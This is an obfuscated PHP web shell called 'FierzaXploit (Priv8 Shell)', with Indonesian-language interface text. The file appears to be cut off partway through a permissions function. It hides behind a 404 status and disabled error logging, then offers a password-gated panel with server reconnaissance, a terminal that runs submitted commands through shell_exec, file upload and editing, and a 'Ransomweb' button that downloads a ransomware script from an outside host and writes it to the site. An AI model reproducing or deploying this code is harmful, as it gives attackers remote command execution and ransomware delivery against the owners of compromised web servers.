<?php

${"GLOBALS"}["tuyjcs"] = "text";
${"GLOBALS"}["pdheomdbyp"] = "filename";
${"GLOBALS"}["gksfovkwb"] = "zip_files";
${"GLOBALS"}["ahzgjerpuvf"] = "res";
${"GLOBALS"}["mgbcqcvinwd"] = "zip";
${"GLOBALS"}["eegzodzoqzhf"] = "out";
${"GLOBALS"}["yvhqdgmtouw"] = "bp";
${"GLOBALS"}["gcvobbdhs"] = "brt";
${"GLOBALS"}["dunsgshwov"] = "cmdPrompt";
${"GLOBALS"}["isqekurmr"] = "sysinfo";
${"GLOBALS"}["rzmdrjj"] = "dir";
${"GLOBALS"}["vavayujug"] = "result";
${"GLOBALS"}["kwftkoivmvzn"] = "sockfd";
${"GLOBALS"}["iggkdlq"] = "errstr";
${"GLOBALS"}["xnavikjf"] = "errno";
${"GLOBALS"}["rgtlwvactfmx"] = "ip";
${"GLOBALS"}["bnispowp"] = "port";
${"GLOBALS"}["epexvt"] = "size";
${"GLOBALS"}["nfgnsboqp"] = "pos";
${"GLOBALS"}["kcobuyr"] = "a";
${"GLOBALS"}["vcavekxuioq"] = "direktori";
${"GLOBALS"}["uvjslbqupilo"] = "info";
${"GLOBALS"}["ctycbl"] = "perms";
${"GLOBALS"}["dodrwd"] = "file";
${"GLOBALS"}["ygmkgdfwc"] = "fp";
${"GLOBALS"}["qddqtxoeu"] = "hasil";
${"GLOBALS"}["xrheucuwnxk"] = "new_name";
${"GLOBALS"}["fddjclswti"] = "scandir";
${"GLOBALS"}["ysysqrsw"] = "lihat";
${"GLOBALS"}["fvutysdvc"] = "buat";
${"GLOBALS"}["fwmwjctjlr"] = "buat_file";
${"GLOBALS"}["wvtnjvizyrw"] = "nama_file";
${"GLOBALS"}["hlzwtga"] = "buat_folder";
${"GLOBALS"}["wwswebcpkj"] = "nama_folder";
${"GLOBALS"}["xoqacnyihh"] = "server_web";
${"GLOBALS"}["lpmhoq"] = "puts";
${"GLOBALS"}["vrjfedpnm"] = "get";
${"GLOBALS"}["oubqfedxsu"] = "curl";
${"GLOBALS"}["umqsdjfzgi"] = "url";
${"GLOBALS"}["cqogeqrmk"] = "command";
${"GLOBALS"}["cazwtkkytyvl"] = "shell";
${"GLOBALS"}["skbbklgmnihm"] = "nama";
${"GLOBALS"}["zfvbxrfaw"] = "folder";
${"GLOBALS"}["iotdmza"] = "pat";
${"GLOBALS"}["jjgcsx"] = "id";
${"GLOBALS"}["kguuutjuj"] = "paths";
${"GLOBALS"}["msrlygrv"] = "path";
${"GLOBALS"}["sopttfrrpdd"] = "lib";
${"GLOBALS"}["hqimdvpxinla"] = "browser";
${"GLOBALS"}["zeqvcllsyai"] = "_";
goto vZECm;
pThGF:
@ini_set("display_errors", 0);
goto iwqPn;
gqboS:
function loginan()
{
	echo "<!doctypehtml><html lang=\"en\"><head><meta charset=\"utf-8\"><meta content=\"image/jpeg; charset=utf-8\"http-equiv=\"Content-Type\"><meta content=\"width=device-width,initial-scale=1\"name=\"viewport\"><link href=\"https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css\"rel=\"stylesheet\"crossorigin=\"anonymous\"integrity=\"sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3\"><link href=\"https://fierzaeriez.github.io/gayaku.min.css\"rel=\"stylesheet\"><link href=\"https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css\"rel=\"stylesheet\"></head><body class=\"bg-dark animate__animated animate__fadeIn\"><div class=\"mt-2 container login\"><center><img class=\"bg-dark border-dark gambar mt-3\"class=\"align-text-top d-inline-block\"alt=\"\"data-aos=\"zoom-in\"height=\"55\"src=\"https://i.ibb.co/HGNQWNW/fococlipping-20211224-85315.png\"width=\"55\"><br><h4 class=\"text-white form-label judul-brand mb-1 mb-2\"data-aos=\"fade-left\"for=\"exampleFormControlInput1\"data-aos-anchor=\"#example-anchor\"data-aos-duration=\"2000\"data-aos-offset=\"500\">- FierzaXploit( Priv8 Shell ) -</h4></center><form method=\"POST\"><div class=\"mb-3\"><input class=\"form-control\"name=\"pass\"id=\"exampleFormControlInput1\"placeholder=\"Please Input Your Password\"autocomplete=\"on\"type=\"password\"> <button class=\"btn btn-outline-light mt-2 w-100\"type=\"submit\"name=\"login\">Log In</button></div></form><label class=\"text-white\"><b>*CAUTION!!</b>: Author Tidak bertanggung jawab atas peretasan yang dilakukan user FX Shell.<br>Hargai Web Developer Dengan Cara Tidak Mendeface Web Yang Mereka Buat</label><div class=\"footer\"data-aos=\"fade-up\"data-aos-anchor-placement=\"center-bottom\"><center>";
	echo "<p class=\"mt-2 info\">Design & Developed By FierzaXploit <br> Copyright <i class=\"bi bi-braces-asterisk\"></i> ";
	echo date("Y") . "</p>";
	echo "</center></div></div><script src=\"https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js\"crossorigin=\"anonymous\"integrity=\"sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p\"></script></body></html>";
}
goto wb7OC;
sLPMF:
@clearstatcache(0);
goto kE1d8;
BA2Hy:
set_time_limit(0);
goto FmfhI;
kE1d8:
@ini_set("log_errors", 0);
goto U1JjH;
wb7OC:
$_SESSION["status"] = "login";
goto RHN3Z;
H1mWi:
if (!empty($_GET["path"])) {
	chdir(htmlspecialchars($_GET["path"]));
}
goto AEURk;
P9Tqq:
http_response_code(404);
goto sLPMF;
FmfhI:
error_reporting(0);
goto P9Tqq;
siwA5:
@ini_set("output_buffering", 0);
goto pThGF;
U1JjH:
@ini_set("max_execution_time", 0);
goto siwA5;
vZECm:
header("X-XSS-Protection: 0");
goto wcESS;
RHN3Z:
if (isset($_SESSION["status"]) == "login") {
	${"GLOBALS"}["yobvunvargx"] = "path";
	${"GLOBALS"}["tgfootxcv"] = "pat";
	echo "<!doctypehtml><html lang=\"en\"id=\"up\"><head><meta charset=\"utf-8\"><meta content=\"width=device-width,initial-scale=1\"name=\"viewport\"><meta content=\"image/jpeg;charset=utf-8\"http-equiv=\"Content-Type\"><meta content=\"https://i.ibb.co/HGNQWNW/fococlipping-20211224-85315.png\"name=\"msapplication-TileImage\"><script src=\"https://cdn.jsdelivr.net/npm/sweetalert2@11\"></script><link href=\"https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css\"rel=\"stylesheet\"crossorigin=\"anonymous\"integrity=\"sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3\"><link href=\"https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css\"rel=\"stylesheet\"><link href=\"https://unpkg.com/aos@2.3.1/dist/aos.css\"rel=\"stylesheet\"><link href=\"https://fierzaeriez.github.io/gayaku.min.css\"rel=\"stylesheet\"><script src=\"https://fierzaeriez.github.io/battery.js\"></script><link href=\"//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/styles/default.min.css\"rel=\"stylesheet\"><link href=\"https://fierzaeriez.github.io/battery.min.css\"rel=\"stylesheet\"></head><body class=\"bg-dark animate__animated animate__fadeIn\"><div class=\"container-fluid\"><nav class=\"mb-3 bg-dark fixed-top navbar navbar-expand-lg navbar-light\"data-aos=\"zoom-out-down\"><div class=\"container\"><p class=\"text-white mt-2\"><i class=\"bi bi-check-circle\"></i> Version : 1.4 (Priv8 Edition)</p><div class=\"btn-group tombol-batrei\"><button class=\"btn btn-dark btn-sm dropdown-toggle\"type=\"button\"aria-expanded=\"false\"data-bs-toggle=\"dropdown\"><i id=\"baterainya\"></i></button><ul class=\"dropdown-menu dropdown-menu-end\"><li><h5 class=\"geser\">Battery :</h5><center><h5 id=\"batre\"></h5></center></li><hr><li class=\"geser st\"><div id=\"charging\">(charging state unknown)</div><div id=\"dischargingTime\">(discharging time unknown)</div></li></ul><form method=\"POST\"><button class=\"btn btn-dark btn-sm\"type=\"submit\"name=\"logout\"><i class=\"bi bi-power\"></i></button></form></div></div></nav></div><br><br><div class=\"container-fluid mt-4 shell\"><center><img class=\"bg-dark border-dark gambar\"class=\"align-text-top d-inline-block\"alt=\"\"data-aos=\"zoom-in\"height=\"55\"src=\"https://i.ibb.co/HGNQWNW/fococlipping-20211224-85315.png\"width=\"55\"><br><h4 class=\"text-white form-label judul-brand mb-1\"data-aos=\"fade-up\"for=\"exampleFormControlInput1\"data-aos-anchor-placement=\"bottom-bottom\">- FierzaXploit(Priv8 Shell) -</h4><label class=\"text-white mb-2\"data-aos=\"fade-down\"data-aos-duration=\"1500\"data-aos-easing=\"linear\">Simple,Responsive & Powerfull</label></center><div class=\"container-fluid\"><div class=\"row\"><div class=\"\">";
	function browsernya()
	{
		${${"GLOBALS"}["hqimdvpxinla"]} = "";
		if (strpos($_SERVER["HTTP_USER_AGENT"], "Netscape")) {
			${${"GLOBALS"}["hqimdvpxinla"]} = "Netscape";
			echo ${${"GLOBALS"}["hqimdvpxinla"]};
		} else {
			if (strpos($_SERVER["HTTP_USER_AGENT"], "Firefox")) {
				${${"GLOBALS"}["hqimdvpxinla"]} = "Mozilla Firefox";
				echo ${${"GLOBALS"}["hqimdvpxinla"]};
			} else {
				if (strpos($_SERVER["HTTP_USER_AGENT"], "Chrome")) {
					${"GLOBALS"}["ikbtkchfphyf"] = "browser";
					${"GLOBALS"}["ryqbswjcj"] = "browser";
					${${"GLOBALS"}["ikbtkchfphyf"]} = "Google Chrome";
					echo ${${"GLOBALS"}["ryqbswjcj"]};
				} else {
					if (strpos($_SERVER["HTTP_USER_AGENT"], "Opera")) {
						$sqnlpq = "browser";
						${$sqnlpq} = "Opera";
						echo ${${"GLOBALS"}["hqimdvpxinla"]};
					} else {
						if (strpos($_SERVER["HTTP_USER_AGENT"], "MSIE")) {
							$bsgugxtvome = "browser";
							${"GLOBALS"}["vneziooimo"] = "browser";
							${${"GLOBALS"}["vneziooimo"]} = "Internet Explorer";
							echo ${$bsgugxtvome};
						} else {
							${${"GLOBALS"}["hqimdvpxinla"]} = "Lainnya";
							echo ${${"GLOBALS"}["hqimdvpxinla"]};
						}
					}
				}
			}
		}
	}
	function lib_installed()
	{
		${"GLOBALS"}["ghrhgkzleiw"] = "lib";
		${"GLOBALS"}["hgccopsvkmmj"] = "lib";
		${"GLOBALS"}["kspfypmklntc"] = "lib";
		${"GLOBALS"}["jixfrynu"] = "lib";
		${"GLOBALS"}["ydivdqcg"] = "lib";
		${${"GLOBALS"}["ghrhgkzleiw"]}[] = "MySQL: " . (function_exists("mysql_connect") ? "<label class='text-success'> ON </label>" : "<label class='text-danger'> OFF </label>");
		${${"GLOBALS"}["jixfrynu"]}[] = " cURL: " . (function_exists("curl_version") ? "<label class='text-success'> ON </label>" : "<label class='text-danger'> OFF <labelp>");
		${${"GLOBALS"}["sopttfrrpdd"]}[] = " WGET: " . (`wget--help` ? "<label class='text-success'> ON </label>" : "<label class='text-danger'> OFF </label>");
		${${"GLOBALS"}["hgccopsvkmmj"]}[] = "Perl: " . (`perl--help` ? "<label class='text-success'> ON </label>" : "<label class='text-danger'> OFF </label>");
		${${"GLOBALS"}["kspfypmklntc"]}[] = " Python: " . (`python--help` ? "<label class='text-success'> ON </label>" : "<label class='text-danger'> OFF </label>");
		return implode(" <b>||</b> ", ${${"GLOBALS"}["ydivdqcg"]});
	}
	${"GLOBALS"}["bgyvgwxue"] = "path";
	echo " <a class=\"information-server text-decoration-none btn-md text-white text-start bg-dark\" data-bs-toggle=\"collapse\" href=\"#collapseExample\" role=\"button\" aria-expanded=\"false\" aria-controls=\"collapseExample\"> <p class=\"\"><i class=\"bi bi-info-circle-fill\"></i> Information Server <i class=\"bi bi-chevron-down\"></i></p> </a> <div class=\"collapse\" id=\"collapseExample\"> <div class=\"card card-body bg-dark mb-3\"> <div class=\"text-white bg-dark tablenya\"> <ul class=\"mb-1\"> <li>Website : " . $_SERVER["SERVER_NAME"] . "</li> <li>Ip Address : " . $_SERVER["SERVER_ADDR"] . "</li> <li>Port : " . $_SERVER["SERVER_PORT"] . "</li> <li>Kernel : " . php_uname() . "</li> <li>Protokol : " . $_SERVER["SERVER_PROTOCOL"] . "</li> <li>Save Data : " . $_SERVER["HTTP_SAVE_DATA"] . "</li> <li>Koneksi : " . $_SERVER["HTTP_CONNECTION"] . "</li> <li>Server : " . $_SERVER["SERVER_SOFTWARE"] . "</li> <li>Root : " . $_SERVER["DOCUMENT_ROOT"] . "</li> <li>G-Interface : " . $_SERVER["GATEWAY_INTERFACE"] . "</li> <li>R-Method : " . $_SERVER["REQUEST_METHOD"] . "</li> ";
	$sieknty = "scandir";
	$hpumfihpd = "file";
	echo "<li>Browser :";
	$bzdjxvsaep = "path";
	${"GLOBALS"}["frxmnzbfy"] = "paths";
	browsernya();
	echo "</li></div></div></div>";
	echo "<div class='fs-6 text-white coba mb-3'><b class='text-white'>[ + ]</b> " . lib_installed() . " </div>";
	echo "</div>";
	${${"GLOBALS"}["bgyvgwxue"]} = str_replace("\\", "/", ${${"GLOBALS"}["msrlygrv"]});
	${${"GLOBALS"}["kguuutjuj"]} = explode("/", ${${"GLOBALS"}["msrlygrv"]});
	echo "<p class='coba mt-1 tulisan tablenya'><i size='15' class=\"pathnya bi bi-folder2-open\"></i> : ~ ";
	foreach (${${"GLOBALS"}["frxmnzbfy"]} as ${${"GLOBALS"}["jjgcsx"]} => ${${"GLOBALS"}["tgfootxcv"]}) {
		$ttnlogbxthfj = "id";
		if (${${"GLOBALS"}["iotdmza"]} == "" && ${$ttnlogbxthfj} == 0) {
			$fcsjsr = "a";
			${$fcsjsr} = true;
			echo " <a class=\"path\" href=\"?path=/\">/</a></li>";
			continue;
		}
		$fzfgdcf = "i";
		$wgmrwqqeqgxf = "i";
		$tdiidxtd = "i";
		if (${${"GLOBALS"}["iotdmza"]} == "") {
			continue;
		}
		echo "<a href=\"?path=";
		for (${$fzfgdcf} = 0; ${$wgmrwqqeqgxf} <= ${${"GLOBALS"}["jjgcsx"]}; ${$tdiidxtd}++) {
			$lguxjykkpup = "i";
			echo "{$paths[$i]}";
			if (${$lguxjykkpup} != ${${"GLOBALS"}["jjgcsx"]}) {
				echo "/";
			}
		}
		echo "\" class=\"path\">" . ${${"GLOBALS"}["iotdmza"]} . "</a>/";
	}
	echo "<br><a href=\"?\" class=\"mt-2 linknya btn btn-light btn-sm\"><i class=\"text-dark bi bi-house-door-fill\"></i></a> <!-- tambah file/folder & ransomweb --> <div class=\"tambah\"> <div class=\"container-fluid\"> <center> <div class=\"row row-cols-4\"> <!-- tambah file --> <div class=\"col\"> <a class=\"path\" href=\"?path=" . ${${"GLOBALS"}["msrlygrv"]} . "&aksi=buatfile\"><font size=\"5\"><i class=\"bi bi-file-earmark-plus-fill\"></i></font> File</a> </div> <!-- akhir tambah file --> <!-- tambah folder --> <div class=\"col\"> <a class=\"path\" href=\"?path=" . ${${"GLOBALS"}["yobvunvargx"]} . "&aksi=buatfolder\"><font size=\"5\"><i class=\"bi bi-folder-plus\"></i></font> Folder</a> </div> <!-- Akhir tambah folder --> <!-- terminal --> <div class=\"col\"> <a class=\"path\" href=\"?path=" . ${$bzdjxvsaep} . "&aksi=terminal\"><font size=\"5\"><i class=\"bi bi-terminal\"></i></font> Terminal</a> </div> <!-- Akhir terminal --> <!-- auto create ransomweb --> <div class=\"col\"> <a class=\"path\" href=\"?path=" . ${${"GLOBALS"}["msrlygrv"]} . "&aksi=buatransom\"><font size=\"5\"><i class=\"bi bi-file-earmark-lock2-fill\"></i></font> Ransom<br>web</a> </div> <!-- akhir auto create ransomweb --> </div> </center> </div> </div> <!-- akhir tambah file/folder & ransomweb --> <form method=\"post\" enctype=\"multipart/form-data\"> <div class=\"uploader file input-group input-group-sm ms-auto\"> <input type=\"file\" name=\"upl\" class=\"form-control bg-dark text-white\" id=\"inputGroupFile04\" aria-describedby=\"inputGroupFileAddon04\" aria-label=\"Upload\"> <button name=\"btn\" class=\"btn btn-outline-light\" type=\"submit\" id=\"inputGroupFileAddon04\"><i class=\"bi bi-cloud-upload-fill\"></i> Upload</button> </div> </form>";
	if (isset($_POST["btn"])) {
		$thymjkq = "lokasi";
		${"GLOBALS"}["ubqfxlgygb"] = "nama";
		${${"GLOBALS"}["ubqfxlgygb"]} = $_FILES["upl"]["name"];
		${"GLOBALS"}["pcmiorwhh"] = "lokasi";
		$cqofxbkuebxb = "folder";
		${${"GLOBALS"}["pcmiorwhh"]} = $_FILES["upl"]["tmp_name"];
		${${"GLOBALS"}["zfvbxrfaw"]} = "";
		if (move_uploaded_file(${$thymjkq}, ${$cqofxbkuebxb} . ${${"GLOBALS"}["skbbklgmnihm"]})) {
			${"GLOBALS"}["xwrdbbm"] = "path";
			echo "<script>Swal.fire(\n 'Berhasil',\n 'File Sukses Diupload',\n 'success'\n );window.location='?path=" . ${${"GLOBALS"}["xwrdbbm"]} . "&status=Berhasil';</script>";
		} else {
			$ydqszgrca = "path";
			echo "<script>Swal.fire(\n 'Gagal',\n 'File Gagal Diupload',\n 'error'\n );window.location='?path=" . ${$ydqszgrca} . "&status=Gagal';</script>";
		}
	}
	if (isset($_POST["logout"])) {
		echo "<script>let timerInterval\n Swal.fire({\n title: 'Log Out Berhasil!!!',\n html: '',\n timer: 2000,\n timerProgressBar: true,\n didOpen: () => {\n Swal.showLoading()\n const b = Swal.getHtmlContainer().querySelector('b')\n timerInterval = setInterval(() => {\n b.textContent = Swal.getTimerLeft()\n }, 100)\n },\n willClose: () => {\n clearInterval(timerInterval)\n }\n }).then((result) => {\n \n if (result.dismiss === Swal.DismissReason.timer) {\n " . session_destroy() . "\n window.location.reload();\n }\n })</script>";
	}
	if ($_GET["aksi"] == "terminal") {
		$bhqtqwihbh = "shell";
		echo "<div class=\"alert\"> <button type=\"button\" class=\"btn btn-danger\" data-bs-dismiss=\"alert\" aria-label=\"Close\"><i class=\"bi bi-x-lg\"></i></button> <form method=\"post\"> <div class=\"input-group flex-nowrap\"> <span class=\"input-group-text\" id=\"addon-wrapping\">root@User :~</span> <input type=\"text\" name=\"cmd\" class=\"form-control\" placeholder=\"Your Command\" aria-label=\"Username\" aria-describedby=\"addon-wrapping\"> </div> </form>";
		if (isset($_POST["cmd"])) {
			${"GLOBALS"}["jlqickpivpzv"] = "command";
			${${"GLOBALS"}["jlqickpivpzv"]} = $_POST["cmd"];
			if (function_exists("shell_exec")) {
				${${"GLOBALS"}["cazwtkkytyvl"]} = `{${${"GLOBALS"}["cqogeqrmk"]}}`;
			} else {
				echo "<script>Swal.fire(\n 'Disabled Function',\n 'error'\n )</script>";
			}
		}
		echo "<div class=\"mb-3\"> <textarea class=\"form-control\" id=\"exampleFormControlTextarea1\" rows=\"20\" aria-label=\"readonly input example\" readonly>" . ${$bhqtqwihbh} . "</textarea> <div id=\"emailHelp\" class=\"form-text\"><font color=\"white\">*NOTE : gunakan command sesuai os, jika os windows gunakan command cmd & jika os linux gunakan command linux<br>os = Operating System</font></div> </div></div>";
	}
	if ($_GET["aksi"] == "buatransom") {
		${"GLOBALS"}["zlrsmxklldmb"] = "get";
		$ykmgfbnnx = "curl";
		${${"GLOBALS"}["umqsdjfzgi"]} = "https://shell.prinsh.com/Nathan/ransomware.txt";
		${$ykmgfbnnx} = curl_init(${${"GLOBALS"}["umqsdjfzgi"]});
		curl_setopt(${${"GLOBALS"}["oubqfedxsu"]}, CURLOPT_RETURNTRANSFER, 1);
		${${"GLOBALS"}["vrjfedpnm"]} = curl_exec(${${"GLOBALS"}["oubqfedxsu"]});
		if (${${"GLOBALS"}["zlrsmxklldmb"]} != "") {
			$fkmufrs = "puts";
			${"GLOBALS"}["wplrfhomzf"] = "get";
			${"GLOBALS"}["heyhpychailr"] = "nama_file";
			$kevcpukvyipf = "puts";
			${${"GLOBALS"}["lpmhoq"]} = fopen("RansomWeb.php", "w");
			fwrite(${$fkmufrs}, ${${"GLOBALS"}["wplrfhomzf"]});
			fclose(${${"GLOBALS"}["lpmhoq"]});
			${${"GLOBALS"}["heyhpychailr"]} = "RansomWeb.php";
			${${"GLOBALS"}["xoqacnyihh"]} = "http://" . $_SERVER["HTTP_HOST"] . "/";
			if (${$kevcpukvyipf} != "") {
				$vkpgqye = "path";
				echo "<script>Swal.fire(\n 'Berhasil',\n 'RansomWeb Sukses Dibuat',\n 'success'\n );window.location='?path=" . ${$vkpgqye} . "';</script>";
			} else {
				echo "<script>Swal.fire(\n 'Gagal',\n 'RansomWeb gagal Dibuat',\n 'error'\n );window.location='?path=" . ${${"GLOBALS"}["msrlygrv"]} . "';</script>";
			}
		}
	}
	if ($_GET["aksi"] == "buatfolder") {
		if (isset($_POST["folderss"])) {
			${${"GLOBALS"}["zfvbxrfaw"]} = $_POST["namaF"];
			${${"GLOBALS"}["wwswebcpkj"]} = ${${"GLOBALS"}["msrlygrv"]} . "/" . ${${"GLOBALS"}["zfvbxrfaw"]};
			${"GLOBALS"}["wtpygt"] = "nama_folder";
			$oejzjqsvyrrt = "buat_folder";
			${${"GLOBALS"}["hlzwtga"]} = mkdir(${${"GLOBALS"}["wtpygt"]});
			if (${$oejzjqsvyrrt}) {
				${"GLOBALS"}["qdbxbjuduff"] = "path";
				echo "<script>Swal.fire(\n 'Berhasil',\n 'Folder Sukses Dibuat',\n 'success'\n );window.location='?path=" . ${${"GLOBALS"}["qdbxbjuduff"]} . "';</script>";
			} else {
				${"GLOBALS"}["drmbsfbpdbgn"] = "path";
				echo "<script>Swal.fire(\n 'Gagal',\n 'Folder Gagal Dibuat',\n 'error'\n );window.location='?path=" . ${${"GLOBALS"}["drmbsfbpdbgn"]} . "';</script>";
			}
		}
		echo " <form method=\"POST\"> <label for=\"exampleFormControlInput1\" class=\"text-white label form-label texxt-white\">Nama Folder :</label> <div class=\"tambahdir input-group mb-3\"> <input name=\"namaF\" type=\"text\" class=\"form-control\" placeholder=\"Masukkan Nama Folder\" aria-describedby=\"button-addon2\"> <button name=\"folderss\" class=\"klik btn btn-outline-secondary\" type=\"submit\" id=\"button-addon2\">Create Folder</button> </div> </form>";
	}
	${"GLOBALS"}["jbqqjql"] = "path";
	if ($_GET["aksi"] == "buatfile") {
		if (isset($_POST["buat"])) {
			$yyogwhfdsme = "nama_file";
			$ynssluln = "buat";
			${"GLOBALS"}["osfbcqmui"] = "isi_file";
			${"GLOBALS"}["sfkjhhmzr"] = "buat_file";
			$gkwqqp = "path";
			$dgxtoueqm = "isi_file";
			${${"GLOBALS"}["wvtnjvizyrw"]} = ${$gkwqqp} . "/" . $_POST["nama_file"];
			${${"GLOBALS"}["osfbcqmui"]} = $_POST["isi"];
			${${"GLOBALS"}["fwmwjctjlr"]} = fopen(${$yyogwhfdsme}, "w");
			fwrite(${${"GLOBALS"}["sfkjhhmzr"]}, ${$dgxtoueqm});
			fclose(${$ynssluln});
			if (empty(${${"GLOBALS"}["fvutysdvc"]})) {
				$sjclsqnuprfq = "path";
				echo "<script>Swal.fire(\n 'Berhasil',\n 'File Sukses Dibuat',\n 'success'\n );window.location='?path=" . ${$sjclsqnuprfq} . "';</script>";
			} else {
				echo "<script>Swal.fire(\n 'Gagal',\n 'File Gagal Dibuat',\n 'error'\n );window.location='?path=" . ${${"GLOBALS"}["msrlygrv"]} . "';</script>";
			}
		}
		echo "<div class=\"alert\"> <center><h4 class=\"text-white\">{Buat File }</h4></center> <form method=\"post\" class=\"mt-3\"> <div class=\"mb-3\"> <label for=\"exampleFormControlInput1\" class=\"text-white form-label\">Nama File :</label> <input type=\"text\" name=\"nama_file\" placeholder=\"Masukkan Nama Filenya\" class=\"form-control\" id=\"exampleFormControlInput1\" placeholder=\"name@example.com\"> </div> <div class=\"mb-3\"> <label for=\"exampleFormControlTextarea1\" class=\"text-white form-label\">Isi File :</label> <textarea class=\"form-control\" name=\"isi\" placeholder=\"Masukkan Isi Filenya\" id=\"exampleFormControlTextarea1\" rows=\"3\"></textarea> </div><br> <button name=\"buat\" class=\"tombol btn btn-outline-success\" type=\"submit\">Create Now</button> </form> <br> <button type=\"button\" class=\"tombol btn btn-danger\" data-bs-dismiss=\"alert\" aria-label=\"Close\">Cancel</button> </div> <br>";
	}
	if (isset($_GET["path_file"])) {
		$ebzdjiw = "lihat";
		${$ebzdjiw} = $_GET["path_file"];
	}
	if ($_GET["aksi"] == "view") {
		echo "<div class='alert'><button type=\"button\" class=\"btn btn-danger\" data-bs-dismiss=\"alert\" aria-label=\"Close\"><i class=\"bi bi-x-lg\"></i></button><pre><code class=\"language-php\">" . htmlspecialchars(file_get_contents(${${"GLOBALS"}["ysysqrsw"]})) . "</code></pre></div>";
	}
	${${"GLOBALS"}["fddjclswti"]} = scandir(${${"GLOBALS"}["jbqqjql"]});
	if ($_GET["aksi"] == "rename") {
		if (isset($_POST["rename_now"])) {
			${"GLOBALS"}["qkdurnhrvdc"] = "rename_file";
			${${"GLOBALS"}["xrheucuwnxk"]} = $_POST["newname"];
			${"GLOBALS"}["aofnnpofuqv"] = "rename_file";
			${${"GLOBALS"}["qkdurnhrvdc"]} = rename(${${"GLOBALS"}["xrheucuwnxk"]}, $_GET["nama_file"]);
			if (file_exists(${${"GLOBALS"}["aofnnpofuqv"]})) {
				echo "<script>alert('Nama File Sudah Digunakan')</script>";
			} else {
				if (rename($_GET["nama_file"], ${${"GLOBALS"}["xrheucuwnxk"]})) {
					${"GLOBALS"}["iuidwmaomfsh"] = "path";
					echo "<script>Swal.fire(\n 'Berhasil',\n 'File Sukses Direname',\n 'success'\n );window.location='?path=" . ${${"GLOBALS"}["iuidwmaomfsh"]} . "';</script>";
				} else {
					echo "<script>Swal.fire(\n 'Gagal',\n 'file Gagal Direname',\n 'error'\n );window.location='?path=" . ${${"GLOBALS"}["msrlygrv"]} . "';</script>";
				}
			}
		}
		echo "<div class=\"alert\"> <form method=\"POST\"> <div class=\"mb-3\"> <label for=\"exampleFormControlInput1\" class=\"text-white form-label\">Name File/Directory</label> <input name=\"newname\" type=\"text\" class=\"form-control\" id=\"exampleFormControlInput1\" value=\"" . $_GET["nama_file"] . "\" placeholder=\"New Name\"> </div> <br> <input type=\"submit\" name=\"rename_now\" value=\"Rename Now\" class=\"tombol btn btn-outline-secondary btn-block\"> </form> <br> <button type=\"button\" class=\"tombol btn btn-danger\" data-bs-dismiss=\"alert\" aria-label=\"Close\">Cancel</button> </div>";
	}
	${"GLOBALS"}["nrtuxdkfwbfs"] = "scandir";
	if ($_GET["aksi"] == "edit") {
		if (isset($_POST["save"])) {
			$wjydqlcald = "hasil";
			$frtwzihdo = "fp";
			${$frtwzihdo} = fopen($_GET["dirf"], "w");
			${${"GLOBALS"}["qddqtxoeu"]} = fwrite(${${"GLOBALS"}["ygmkgdfwc"]}, $_POST["src"]);
			if (${$wjydqlcald}) {
				echo "<script>Swal.fire(\n 'Berhasil',\n 'File Sukses Diedit',\n 'success'\n );window.location='?path=" . ${${"GLOBALS"}["msrlygrv"]} . "';</script>";
			} else {
				echo "<script>Swal.fire(\n 'Gagal',\n 'File Gagal Diedit',\n 'error'\n );window.location='?path=" . ${${"GLOBALS"}["msrlygrv"]} . "';</script>";
			}
		}
		echo "<div class='container alert'>\n <center><h4 class=\"text-white\">{Edit File }</h4></center>\n <form method='POST'>\n <div class=\"mb-3\">\n <label for=\"exampleFormControlTextarea1\" class=\"text-white form-label\">Code :</label>\n <textarea class=\"form-control\" id=\"exampleFormControlTextarea1\" rows=\"20\" name=\"src\">" . htmlspecialchars(file_get_contents($_GET["dirf"])) . "</textarea><a href=\"?Home\" type=\"button\" class=\"tutup btn-close\" data-bs-dismiss=\"alert\" aria-label=\"Close\"></a>\n </div>\n <button name=\"save\" class=\"tombol btn btn-outline-secondary\" type=\"submit\">Simpan</button>\n </form>\n <br>\n <button type=\"button\" class=\"tombol btn btn-danger\" data-bs-dismiss=\"alert\" aria-label=\"Close\">Cancel</button>\n </div>";
	}
	function perms($file)
	{
		$hbsxgnrss = "perms";
		${"GLOBALS"}["spywtyo"] = "info";
		$yyspyznvt = "perms";
		${"GLOBALS"}["nidnjmyj"] = "perms";
		${"GLOBALS"}["ooelsib"] = "info";
		$zmsgkrbif = "perms";
		${"GLOBALS"}["wpnwdiduad"] = "perms";
		$viyreyn = "perms";
		${$yyspyznvt} = fileperms(${${"GLOBALS"}["dodrwd"]});
		$ndyurkkvxe = "perms";
		$jsqokv = "perms";
		${"GLOBALS"}["bldxzykl"] = "info";
		$dqwowaa = "info";
		${"GLOBALS"}["riwnbas"] = "info";
		$jfmrnfgsglwr = "perms";
		${"GLOBALS"}["tqoiul"] = "info";
		${"GLOBALS"}["jwwyctllfob"] = "perms";
		if ((${${"GLOBALS"}["wpnwdiduad"]} & 49152) == 49152) {
			${"GLOBALS"}["pktuwkwgtda"] = "info";
			${${"GLOBALS"}["pktuwkwgtda"]} = "s";
		} elseif ((${${"GLOBALS"}["ctycbl"]} & 40960) == 40960) {
			$wjobpltqk = "info";
			${$wjobpltqk} = "l";
		} elseif ((${$zmsgkrbif} & 32768) == 32768) {
			$ybalxf = "info";
			${$ybalxf} = "-";
		} elseif ((${${"GLOBALS"}["ctycbl"]} & 24576) == 24576) {
			${${"GLOBALS"}["uvjslbqupilo"]} = "b";
		} elseif ((${${"GLOBALS"}["ctycbl"]} & 16384) == 16384) {
			${${"GLOBALS"}["uvjslbqupilo"]} = "d";
		} elseif ((${$hbsxgnrss} & 8192) == 8192) {
			${${"GLOBALS"}["uvjslbqupilo"]} = "c";
		} elseif ((${$viyreyn} & 4096) == 4096) {
			${${"GLOBALS"}["uvjslbqupilo"]} = "p";
		} else {
			${${"GLOBALS"}["uvjslbqupilo"]} = "u";
		}
